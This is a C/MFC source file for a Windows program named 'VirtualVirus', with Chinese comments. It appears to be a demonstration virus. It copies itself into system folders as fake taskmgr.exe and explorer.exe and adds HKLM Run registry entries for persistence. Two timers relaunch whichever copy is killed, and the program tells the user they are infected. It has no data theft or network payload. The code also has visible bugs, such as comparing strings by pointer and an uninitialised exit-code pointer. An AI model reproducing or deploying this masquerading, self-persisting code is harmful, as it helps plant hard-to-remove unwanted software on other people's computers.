#define Debug true

#include <stdio.h>
#include <AFX.h>
#include <Tlhelp32.h>
#include <windows.h>
#include "PsApi.h"
#pragma comment(lib, "PSAPI.LIB" )

CString getFileName();
long copyFile(CString destination);
void initial();
void editRegTable();
bool ProgramIsAlive(LPCSTR ExeName);

CString sSysDirect, sCurrentFile, sFile1, sFile2;
DWORD processID1, processID2;
HANDLE hProcess1, hProcess2;
char vBuffer1[200], vBuffer2[200];

//时钟1的回调函数
void CALLBACK TimerFunc1( 
    HWND hwnd,        // handle to window for timer messages 
    UINT message,     // WM_TIMER message 
    UINT idTimer,     // timer identifier 
    DWORD dwTime)     // current system time 
{
	static int i = 0;
	i ++;
	i = i % 600;
	if (i == 0)
		MessageBox(NULL, "Hello, I am still here!", "VirtualVirus", MB_OK);

	editRegTable();
	if(!ProgramIsAlive("explorer.exe"))
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi2;

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi2, sizeof(pi2) );

		if( !CreateProcess( NULL,	// No module name (use command line). 
			sFile2.GetBuffer(300),	// Command line. 
			NULL,					// Process handle not inheritable. 
			NULL,					// Thread handle not inheritable. 
			FALSE,					// Set handle inheritance to FALSE. 
			0,						// No creation flags. 
			NULL,					// Use parent's environment block. 
			NULL,					// Use parent's starting directory. 
			&si,					// Pointer to STARTUPINFO structure.
			&pi2 )					// Pointer to PROCESS_INFORMATION structure.
			) 
		{
			MessageBox(NULL,  "CreateProcess(file2) failed.", "", MB_OK );
		}

	}
}
//时钟2的回调函数
void CALLBACK TimerFunc2( 
    HWND hwnd,        // handle to window for timer messages 
    UINT message,     // WM_TIMER message 
    UINT idTimer,     // timer identifier 
    DWORD dwTime)     // current system time 
{
	static int i = 0;
	i ++;
	i = i % 100;
	if (i == 300)
		MessageBox(NULL, "Hello, I am still here!", "VirtualVirus", MB_OK);

	editRegTable();
	if(!ProgramIsAlive("taskmgr.exe"))
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi1;
		
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi1, sizeof(pi1) );
		
		if( !CreateProcess( NULL,	// No module name (use command line). 
			sFile1.GetBuffer(300),	// Command line. 
			NULL,					// Process handle not inheritable. 
			NULL,					// Thread handle not inheritable. 
			FALSE,					// Set handle inheritance to FALSE. 
			0,						// No creation flags. 
			NULL,					// Use parent's environment block. 
			NULL,					// Use parent's starting directory. 
			&si,					// Pointer to STARTUPINFO structure.
			&pi1 )					// Pointer to PROCESS_INFORMATION structure.
			) 
		{
			MessageBox(NULL,  "CreateProcess(file1) failed.", "", MB_OK );
		}
	}
}
//程序入口
int WINAPI WinMain(          
	HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
	initial();

	if(sCurrentFile == "taskmgr.exe")
	{
		SetTimer(NULL, NULL, 50, (TIMERPROC)TimerFunc1);
	}
	else if (sCurrentFile == "explorer.exe")
	{
		SetTimer(NULL, NULL, 50, (TIMERPROC)TimerFunc2);
	}
	else
	{
		if (Debug)
		{
			DeleteFile(sFile1);
			DeleteFile(sFile2);
		}

		copyFile(sFile1);
		copyFile(sFile2);
		
		STARTUPINFO si;
		PROCESS_INFORMATION pi1, pi2;
		
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi1, sizeof(pi1) );
		
		if( !CreateProcess( NULL,	// No module name (use command line). 
			sFile1.GetBuffer(300),	// Command line. 
			NULL,					// Process handle not inheritable. 
			NULL,					// Thread handle not inheritable. 
			FALSE,					// Set handle inheritance to FALSE. 
			0,						// No creation flags. 
			NULL,					// Use parent's environment block. 
			NULL,					// Use parent's starting directory. 
			&si,					// Pointer to STARTUPINFO structure.
			&pi1 )					// Pointer to PROCESS_INFORMATION structure.
			) 
		{
			MessageBox(NULL,  "CreateProcess(file1) failed.", "", MB_OK );
		}

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi2, sizeof(pi2) );

		if( !CreateProcess( NULL,	// No module name (use command line). 
			sFile2.GetBuffer(300),	// Command line. 
			NULL,					// Process handle not inheritable. 
			NULL,					// Thread handle not inheritable. 
			FALSE,					// Set handle inheritance to FALSE. 
			0,						// No creation flags. 
			NULL,					// Use parent's environment block. 
			NULL,					// Use parent's starting directory. 
			&si,					// Pointer to STARTUPINFO structure.
			&pi2 )					// Pointer to PROCESS_INFORMATION structure.
			) 
		{
			MessageBox(NULL,  "CreateProcess(file2) failed.", "", MB_OK );
		}
		/*//添加“计划任务” 由于添加计划任务时需要密码，所以还是不添加了吧
		CoInitialize(NULL);
		CScheduledTask task;
		task.SetProgram ( sFile3 );
		SYSTEMTIME stBegin;
		GetSystemTime (&stBegin);
		stBegin.wHour = 12;
		stBegin.wMinute = 0;
		task.SetStartDateTime ( stBegin );
		task.SetFrequency ( CScheduledTask::freqDaily );
		task.SaveTask ( "task" );
		CoUninitialize();*/

		MessageBox(NULL, "You have been infected by VirtualVirus!", "Warning", MB_OK);

		//关闭当前进程
		LPDWORD lpExitCode;
		GetExitCodeProcess(GetModuleHandle(NULL),lpExitCode);
		ExitProcess((unsigned int)lpExitCode);
	}
	//注意：定时器只有在程序的生命周期内才有效
	//所以要加入以下死循环（因为只有当收到WM_QUIT消息时，GetMessage才返回false）
	//问题：GetMessage这个函数能收到消息吗？
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

//获取当前文件名
CString getFileName()
{
	char cFileName[300];
	GetModuleFileName(NULL, cFileName, 300);
	CString sFileName = cFileName;
	if (sFileName.Find("taskmgr.exe") > -1)
		return "taskmgr.exe";
	else if (sFileName.Find("explorer.exe") > -1)
		return "explorer.exe";
	else
		return "VirtualVirus.exe";
}
//复制文件
long copyFile(CString destination)
{
	return CopyFile(sCurrentFile, destination, true);
}

//初始化全局变量
void initial()
{
	char cSysDirect[100];
	GetSystemDirectory(cSysDirect, 100);

	sSysDirect = cSysDirect;
	sSysDirect.Replace("system32", "taskmgr.exe");
	sFile1 = sSysDirect;

	sSysDirect = cSysDirect;
	sFile2 = sSysDirect + "\\explorer.exe";

	sCurrentFile = getFileName();
}
//查找与修改注册表
void editRegTable()
{
	HKEY hKey;    //句柄
	char Subkey[]  = "software\\microsoft\\windows\\currentversion\\run";
	char ValueName1[] = "taskmgr", ValueName2[] = "explorer";
	BYTE Value[200];
	DWORD Size;

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,Subkey,0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)        //第一步
    {
		MessageBox(NULL, "error", "", MB_OK);
		return;
    }
	Size = sizeof(Value);
	if(RegQueryValueEx(hKey,ValueName1,0,NULL,Value,&Size)!=ERROR_SUCCESS || Value != sFile1)
	{
		//设置值
		RegSetValueEx(hKey, ValueName1, 0L, REG_SZ, (unsigned char *)(const char *)sFile1, strlen(sFile1) + 1);
	}
	if(RegQueryValueEx(hKey,ValueName2,0,NULL,Value,&Size)!=ERROR_SUCCESS || Value != sFile2)
	{
		//设置值
		RegSetValueEx(hKey, ValueName2, 0L, REG_SZ, (unsigned char *)(const char *)sFile2, strlen(sFile2) + 1);
	}
	RegCloseKey(hKey); 
}
//根据进程名获得进程ID，然后根据路径判断是否为虚拟病毒的进程
bool ProgramIsAlive(LPCSTR ExeName) 
{
	bool bIsAlive = false;
	char *File; 
	HANDLE hProcessSnap; 
	PROCESSENTRY32 pe32; 
	
	if (!ExeName && !ExeName[0]) 
		return false; 
	File = strrchr(ExeName, '\\'); 
	if (File!=0)
		ExeName = File+1; 
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
	if (hProcessSnap == (HANDLE)-1)
		return false;
	memset(&pe32, 0, sizeof(pe32)); 
	pe32.dwSize = sizeof(PROCESSENTRY32); 
	if (Process32First(hProcessSnap, &pe32)) 
	{
		do {
			File = strrchr(pe32.szExeFile, '\\'); 
			File = File ? File+1 : pe32.szExeFile; 
			if (strcmpi(File,ExeName)==0) 
			{
				if (ExeName == "taskmgr.exe")
				{
					memset(vBuffer1, 0, sizeof(vBuffer1));
					processID1 = pe32.th32ProcessID;
					hProcess1 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID1);
					GetModuleFileNameEx(hProcess1, 0, vBuffer1, sizeof(vBuffer1));
					//MessageBox(NULL, vBuffer1, "", MB_OK);
					if (vBuffer1 == sFile1)
						bIsAlive = true;
				}
				else if (ExeName == "explorer.exe")
				{
					memset(vBuffer2, 0, sizeof(vBuffer2));
					processID2 = pe32.th32ProcessID;
					hProcess2 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID2);
					GetModuleFileNameEx(hProcess2, 0, vBuffer2, sizeof(vBuffer2));
					//MessageBox(NULL, vBuffer2, "", MB_OK);
					if (vBuffer2 == sFile2)
						bIsAlive = true;
				}
			}
		}
		while(Process32Next(hProcessSnap,&pe32));

		return bIsAlive;
	} 
	
	CloseHandle(hProcessSnap); 

	return false;//没找到
}